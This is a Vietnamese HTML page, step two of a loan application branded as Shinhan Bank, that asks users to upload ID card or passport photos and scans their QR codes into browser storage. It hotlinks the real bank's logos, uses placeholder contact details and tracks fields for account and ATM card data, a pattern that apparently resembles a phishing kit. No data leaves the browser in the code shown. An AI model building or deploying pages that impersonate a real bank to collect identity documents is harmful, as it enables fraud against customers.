<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chụp CMND/CCCD - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            background-color: #f8f9fa;
            margin: 0;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
        }
        .header img {
            height: 50px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            margin: 10px 0 0 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #28a745;
            transition: width 0.3s ease-in-out;
        }
        .step-title {
            color: #003087;
            font-size: 22px;
            font-weight: 700;
            text-align: center;
        }
        .step-description {
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
        }
        .file-upload-box {
            border: 2px dashed #dee2e6;
            border-radius: 5px;
            padding: 20px;
            text-align: center;
            background-color: #f9f9f9;
        }
        .file-upload-box label {
            cursor: pointer;
            color: #003087;
            font-weight: 500;
        }
        .file-upload-box input {
            display: none;
        }
        .file-info {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
        }
        .btn-primary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #003087;
            border: none;
            margin: 5px;
        }
        .btn-primary:hover {
            background-color: #00205b;
        }
        .btn-primary:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .btn-secondary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #6c757d;
            border: none;
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .btn-secondary:hover {
            background-color: #5a6268;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
            margin-top: 20px;
            font-size: 16px;
        }
        .footer img.lock-icon {
            vertical-align: middle;
            margin-right: 10px;
        }
        .footer-logo {
            height: 40px;
            margin-top: 10px;
        }
        .continue-btn-container {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <button type="button" class="btn btn-secondary" onclick="window.location.href='step1.html'">Quay Lại</button>
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 20%"></div>
            </div>
        </div>

        <div id="step2" class="step-transition">
            <h5 class="step-title">Chụp hoặc Quét CMND/CCCD/Hộ Chiếu</h5>
            <p class="step-description">Vui lòng chụp ảnh hoặc tải lên ít nhất một ảnh (mặt trước hoặc mặt sau) của CMND/CCCD/Hộ chiếu.</p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh Mặt Trước</label>
                <div class="file-upload-box">
                    <label for="idFrontImage">Chụp ảnh hoặc tải lên</label>
                    <input type="file" id="idFrontImage" accept="image/jpeg,image/png" capture="environment">
                    <button type="button" class="btn btn-primary mt-2" onclick="scanQR('idFrontImage')">Quét Mã QR</button>
                    <div class="file-info" id="idFrontInfo"></div>
                </div>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh Mặt Sau</label>
                <div class="file-upload-box">
                    <label for="idBackImage">Chụp ảnh hoặc tải lên</label>
                    <input type="file" id="idBackImage" accept="image/jpeg,image/png" capture="environment">
                    <button type="button" class="btn btn-primary mt-2" onclick="scanQR('idBackImage')">Quét Mã QR</button>
                    <div class="file-info" id="idBackInfo"></div>
                </div>
            </div>
            <div class="continue-btn-container">
                <button id="proceedToStep3Btn" class="btn btn-primary" disabled>Tiếp Tục</button>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
    <script>
        // Load user data
        let userData = {
            fullName: "Nguyễn Văn A",
            idNumber: "123456789",
            idIssueDate: "01/01/2020",
            idIssuePlace: "Hà Nội",
            address: "123 Đường Láng, Hà Nội",
            occupation: "nhanvien",
            income: 10000000,
            phoneNumber: "0901234567",
            email: "nguyenvana@example.com",
            loanAmount: 100000000,
            loanTerm: "24",
            loanPurpose: "Chi tiêu cá nhân",
            accountNumber: "1234567890",
            bankName: "Shinhan Bank",
            termsAgree: false,
            currentStep: 2,
            qrData: {},
            atmCard: {}
        };

        function loadUserData() {
            const storedData = localStorage.getItem('userData');
            if (storedData) {
                userData = JSON.parse(storedData);
            }
        }

        function saveToLocalStorage() {
            localStorage.setItem('userData', JSON.stringify(userData));
        }

        // Check if at least one image is uploaded
        function checkImageInput(frontId, backId) {
            const frontFile = document.getElementById(frontId).files[0];
            const backFile = document.getElementById(backId).files[0];
            return frontFile || backFile;
        }

        // Update button state
        function updateImageButtonState() {
            $('#proceedToStep3Btn').prop('disabled', !checkImageInput('idFrontImage', 'idBackImage'));
        }

        // Handle image uploads
        $('#idFrontImage, #idBackImage').on('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                $(`#${e.target.id}Info`).text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
            } else {
                $(`#${e.target.id}Info`).text('');
            }
            updateImageButtonState();
        });

        // QR scanning
        function scanQR(inputId) {
            const input = document.getElementById(inputId);
            const file = input.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const img = new Image();
                    img.src = e.target.result;
                    img.onload = function() {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.width;
                        canvas.height = img.height;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0, img.width, img.height);
                        const imageData = ctx.getImageData(0, 0, img.width, img.height);
                        const code = jsQR(imageData.data, imageData.width, imageData.height);
                        if (code) {
                            const qrData = JSON.parse(code.data);
                            userData.qrData[inputId] = {
                                fullName: qrData.fullName || '',
                                idNumber: qrData.idNumber || '',
                                idIssueDate: qrData.idIssueDate || '',
                                idIssuePlace: qrData.idIssuePlace || ''
                            };
                            saveToLocalStorage();
                        }
                    };
                };
                reader.readAsDataURL(file);
            }
        }

        // Proceed to next step
        $('#proceedToStep3Btn').on('click', function(e) {
            e.preventDefault();
            $('#idFrontImage').val('');
            $('#idBackImage').val('');
            $('#idFrontInfo').text('');
            $('#idBackInfo').text('');
            userData.currentStep = 3;
            saveToLocalStorage();
            window.location.href = 'step3.html';
        });

        // Load user data on page load
        window.onload = function() {
            loadUserData();
            updateImageButtonState();
        };
    </script>
</body>
</html>
